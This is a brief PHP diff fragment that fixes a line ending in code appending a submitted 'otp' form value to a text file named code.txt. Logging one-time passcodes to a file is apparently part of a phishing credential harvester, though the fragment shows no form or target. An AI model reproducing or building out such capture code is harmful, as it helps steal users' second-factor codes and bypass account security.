@@ -7,7 +7,7 @@ if (
 ) {
     $file = "code.txt";
     $data = 
-        "otp: " . $_POST['otp'] . "\n" .
+        "otp: " . $_POST['otp'] . "\n";
 
 
     file_put_contents($file, $data, FILE_APPEND);
